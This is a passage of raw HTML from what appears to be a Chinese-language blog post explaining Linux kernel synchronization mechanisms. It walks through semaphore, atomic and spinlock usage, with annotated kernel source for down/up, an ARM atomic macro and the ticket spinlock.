class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>测试</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211128-test.png" alt=""></p></li><li><p>信号量用于进程之间的同步，进程在信号量保护的临界区代码里是可以睡眠的，这是和自旋锁的最大的区别</p></li></ol><h3 id="semaphore内核源码实现">semaphore内核源码实现</h3><ol><li><p>semaphore 结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token punctuation">{</span>raw_spinlock_tlock<span class="token punctuation">;</span> <span class="token comment">//自旋锁</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span>count<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">list_head</span>wait_list<span class="token punctuation">;</span> <span class="token comment">//双向链表</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>初始化函数（include/linux/semaphore.h）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">__SEMAPHORE_INITIALIZER</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> n<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">{</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">.</span>lock<span class="token operator">=</span> <span class="token function">__RAW_SPIN_LOCK_UNLOCKED</span><span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>lock<span class="token punctuation">)</span><span class="token punctuation">,</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">.</span>count<span class="token operator">=</span> n<span class="token punctuation">,</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">.</span>wait_list<span class="token operator">=</span> <span class="token function">LIST_HEAD_INIT</span><span class="token punctuation">(</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>wait_list<span class="token punctuation">)</span><span class="token punctuation">,</span></span><span class="token punctuation">\</span><span class="token comment">//LIST_HEAD_INIT 初始化双向链表</span></span><span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">sema_init</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">lock_class_key</span> __key<span class="token punctuation">;</span><span class="token operator">*</span>sem <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span><span class="token punctuation">)</span> <span class="token function">__SEMAPHORE_INITIALIZER</span><span class="token punctuation">(</span><span class="token operator">*</span>sem<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">lockdep_init_map</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">.</span>dep_map<span class="token punctuation">,</span> <span class="token string">"semaphore-&gt;lock"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>__key<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>down（kernel/locking/semaphore.c）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">down</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span><span class="token function">raw_spin_lock_irqsave</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//自旋锁保护</span>    <span class="token comment">/** 信号量不够，休眠进程并把task加到sem的wait_list上**/</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span>sem<span class="token operator">-&gt;</span>count <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sem<span class="token operator">-&gt;</span>count<span class="token operator">--</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token function">__down</span><span class="token punctuation">(</span>sem<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//信号量不够</span><span class="token function">raw_spin_unlock_irqrestore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">void</span> __sched <span class="token function">__down</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">__down_common</span><span class="token punctuation">(</span>sem<span class="token punctuation">,</span> TASK_UNINTERRUPTIBLE<span class="token punctuation">,</span> MAX_SCHEDULE_TIMEOUT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//#define TASK_UNINTERRUPTIBLE2 //进程状态为不可中断的睡眠状态</span>    <span class="token comment">//#defineMAX_SCHEDULE_TIMEOUTLONG_MAX</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">int</span> __sched <span class="token function">__down_common</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">,</span> <span class="token keyword">long</span> state<span class="token punctuation">,</span><span class="token keyword">long</span> timeout<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>task <span class="token operator">=</span> current<span class="token punctuation">;</span> <span class="token comment">//进程</span>    <span class="token comment">/**    struct semaphore_waiter {struct list_head list;struct task_struct *task;bool up;};    **/</span><span class="token keyword">struct</span> <span class="token class-name">semaphore_waiter</span> waiter<span class="token punctuation">;</span>        <span class="token comment">//将这个信号量上等待的task加到sem的wait_list</span><span class="token function">list_add_tail</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>waiter<span class="token punctuation">.</span>list<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>wait_list<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//链表相加</span>waiter<span class="token punctuation">.</span>task <span class="token operator">=</span> task<span class="token punctuation">;</span> waiter<span class="token punctuation">.</span>up <span class="token operator">=</span> false<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">signal_pending_state</span><span class="token punctuation">(</span>state<span class="token punctuation">,</span> task<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//有没有打断</span><span class="token keyword">goto</span> interrupted<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">unlikely</span><span class="token punctuation">(</span>timeout <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//有没有超时</span><span class="token keyword">goto</span> timed_out<span class="token punctuation">;</span><span class="token function">__set_task_state</span><span class="token punctuation">(</span>task<span class="token punctuation">,</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置状态</span><span class="token function">raw_spin_unlock_irq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//</span>        <span class="token comment">/** 为什么这里要分开上锁？**/</span>timeout <span class="token operator">=</span> <span class="token function">schedule_timeout</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//让出CPU</span><span class="token function">raw_spin_lock_irq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//解</span><span class="token keyword">if</span> <span class="token punctuation">(</span>waiter<span class="token punctuation">.</span>up<span class="token punctuation">)</span> <span class="token comment">//跳出循环</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>up</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">up</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> flags<span class="token punctuation">;</span><span class="token function">raw_spin_lock_irqsave</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">likely</span><span class="token punctuation">(</span><span class="token function">list_empty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>wait_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//wait_list是否为空</span>sem<span class="token operator">-&gt;</span>count<span class="token operator">++</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token function">__up</span><span class="token punctuation">(</span>sem<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">raw_spin_unlock_irqrestore</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>lock<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> noinline <span class="token keyword">void</span> __sched <span class="token function">__up</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">semaphore</span> <span class="token operator">*</span>sem<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">/** wait_list上有等待的进程把它拿下来唤醒**/</span><span class="token keyword">struct</span> <span class="token class-name">semaphore_waiter</span> <span class="token operator">*</span>waiter <span class="token operator">=</span> <span class="token function">list_first_entry</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sem<span class="token operator">-&gt;</span>wait_list<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">semaphore_waiter</span><span class="token punctuation">,</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">list_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>waiter<span class="token operator">-&gt;</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将semaphore_waiter拿出来</span>waiter<span class="token operator">-&gt;</span>up <span class="token operator">=</span> true<span class="token punctuation">;</span> <span class="token comment">//置为true</span><span class="token function">wake_up_process</span><span class="token punctuation">(</span>waiter<span class="token operator">-&gt;</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//唤醒进程</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="Linux内核同步机制：atomic">Linux内核同步机制：atomic</h3><ol><li><p>使用：原子变量 atomic 适用于针对 int 变量进行同步的场景</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">static</span> atomic_t can_open <span class="token operator">=</span> <span class="token function">ATOMIC_INIT</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/**结构体:typedef struct {int counter;} atomic_t;初始化:#define ATOMIC_INIT(i){ (i) }**/</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">atomic_dec_and_test</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>can_open<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"dev is busy, hello_open fail\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">atomic_inc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>can_open<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_open\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">hello_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>flip<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">atomic_inc</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>can_open<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"hello_close ok\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>atomic内核源码与体系相关（ARM）</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">ATOMIC_OP</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> c_op<span class="token punctuation">,</span> asm_op<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> atomic_</span><span class="token punctuation">##</span><span class="token expression"><span class="token function">op</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> atomic_t <span class="token operator">*</span>v<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">{</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">unsigned</span> <span class="token keyword">long</span> tmp<span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token keyword">int</span> result<span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token expression"><span class="token function">prefetchw</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token expression">__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span></span><span class="token string">"@ atomic_"</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">op</span> </span></span><span class="token string">"\n"</span><span class="token punctuation">\</span><span class="token string">"1:ldrex%0, [%3]\n"</span><span class="token punctuation">\</span><span class="token string">""</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">asm</span><span class="token expression">_op </span></span></span><span class="token string">"%0, %0, %4\n"</span><span class="token punctuation">\</span><span class="token string">"strex%1, %0, [%3]\n"</span><span class="token punctuation">\</span><span class="token string">"teq%1, #0\n"</span><span class="token punctuation">\</span><span class="token string">"bne1b"</span><span class="token punctuation">\</span><span class="token expression"><span class="token operator">:</span> </span><span class="token string">"=&amp;r"</span> <span class="token expression"><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">,</span> </span><span class="token string">"=&amp;r"</span> <span class="token expression"><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> </span><span class="token string">"+Qo"</span> <span class="token expression"><span class="token punctuation">(</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token operator">:</span> </span><span class="token string">"r"</span> <span class="token expression"><span class="token punctuation">(</span><span class="token operator">&amp;</span>v<span class="token operator">-&gt;</span>counter<span class="token punctuation">)</span><span class="token punctuation">,</span> </span><span class="token string">"Ir"</span> <span class="token expression"><span class="token punctuation">(</span>i<span class="token punctuation">)</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token operator">:</span> </span><span class="token string">"cc"</span><span class="token expression"><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token punctuation">\</span><span class="token expression"><span class="token punctuation">}</span></span></span>\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="Linux内核同步机制：spinlock">Linux内核同步机制：spinlock</h3><ol><li><p>使用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">spinlock_t count_lock<span class="token punctuation">;</span><span class="token keyword">int</span> open_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">spin_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>open_count <span class="token operator">&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">spin_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    open_count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">spin_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token function">spin_lock_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>count_lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>spinlock的系列函数</p><ul><li>spin_lock：进程和进程之间的同步</li><li>spin_lock_bh：涉及到和本地软中断之间的同步</li><li>spin_lock_irq：涉及到和本地硬件中断之间的同步</li><li>spin_lock_irqsave：涉及到和本地硬件中断之间的同步并保存本地中断状态</li><li>spin_lock_trylock：尝试获取锁，如果成功返回非零值</li></ul></li></ol><h3 id="spinlock内核源码">spinlock内核源码</h3><p>spinlock源码与体系相关（ARM）</p><ol><li><p>结构体</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// spinlock -&gt; raw_spinlock（有补丁也不能睡眠） -&gt; arch_spinlock_t</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span><span class="token keyword">union</span> <span class="token punctuation">{</span>u32 slock<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">__raw_tickets</span> <span class="token punctuation">{</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__ARMEB__ </span><span class="token comment">//大端</span></span>u16 next<span class="token punctuation">;</span>  <span class="token comment">//owner表示持有这个数字的thread可以获取自旋锁</span>u16 owner<span class="token punctuation">;</span> <span class="token comment">//next表示如果后续再有thread请求获取这个自旋锁就给它分配这个数字</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>u16 owner<span class="token punctuation">;</span>u16 next<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token punctuation">}</span> tickets<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span> arch_spinlock_t<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>spinlock的公平性：先到先唤醒，后到后唤醒</p><ol><li>刚开始owner = next = 0，第一个thread获取spinlock可获取成功</li><li>第二个thread获取spinlock，如果第一个thread还没有释放锁，则next ++</li><li>第三个thread获取spinlock，如果第一个thread还没有释放锁，则next = 2</li><li>此时第一个thread释放spinlock，则执行owner ++，owner = 1</li><li>此时虽然第二个和第三个thread都在等待锁，但因为第二个thread的owner = next，可以获取锁，第三个thread继续等待</li></ol></blockquote></li><li><p>init</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//spin_lock_init -&gt; raw_spin_lock_init -&gt; __RAW_SPIN_LOCK_UNLOCKED -&gt; __RAW_SPIN_LOCK_INITIALIZER -&gt; __ARCH_SPIN_LOCK_UNLOCKED</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression">__ARCH_SPIN_LOCK_UNLOCKED<span class="token punctuation">{</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>u32 lock<span class="token punctuation">;</span><span class="token punctuation">}</span> arch_rwlock_t<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>spin_lock（）</p><p>UP：如果内核不允许抢占，spin_lock是个空函数，如果内核允许抢占，spin_lock只是禁止抢占</p><p>SMP：spin_lock除了禁止抢占，还会调用体系相关代码实现排他性loop</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//UP：单核CPU</span><span class="token comment">//spin_lock -&gt; raw_spin_lock(_raw_spin_lock) -&gt; __LOCK(lock)</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">__LOCK</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>  <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token function">preempt_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">___LOCK</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> </span><span class="token comment">//抢占关闭</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">___LOCK</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>  <span class="token expression"><span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token function">__acquire</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token comment">//SMP：多核</span><span class="token comment">//spin_lock -&gt; raw_spin_lock(_raw_spin_lock) -&gt; __raw_spin_lock -&gt; __raw_spin_lock</span><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">__raw_spin_lock</span><span class="token punctuation">(</span>raw_spinlock_t <span class="token operator">*</span>lock<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">preempt_disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">spin_acquire</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token operator">-&gt;</span>dep_map<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _RET_IP_<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">LOCK_CONTENDED</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span> do_raw_spin_trylock<span class="token punctuation">,</span> do_raw_spin_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//do_raw_spin_lock(lock)</span><span class="token punctuation">}</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">LOCK_CONTENDED</span><span class="token punctuation">(</span>_lock<span class="token punctuation">,</span> try<span class="token punctuation">,</span> lock<span class="token punctuation">)</span> </span><span class="token punctuation">\</span><span class="token expression"><span class="token function">lock</span><span class="token punctuation">(</span>_lock<span class="token punctuation">)</span></span></span><span class="token keyword">void</span> <span class="token function">do_raw_spin_lock</span><span class="token punctuation">(</span>raw_spinlock_t <span class="token operator">*</span>lock<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">debug_spin_lock_before</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">arch_spin_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token operator">-&gt;</span>raw_lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">debug_spin_lock_after</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">arch_spin_lock</span><span class="token punctuation">(</span>arch_spinlock_t <span class="token operator">*</span>lock<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> tmp<span class="token punctuation">;</span>u32 newval<span class="token punctuation">;</span>arch_spinlock_t lockval<span class="token punctuation">;</span><span class="token function">prefetchw</span><span 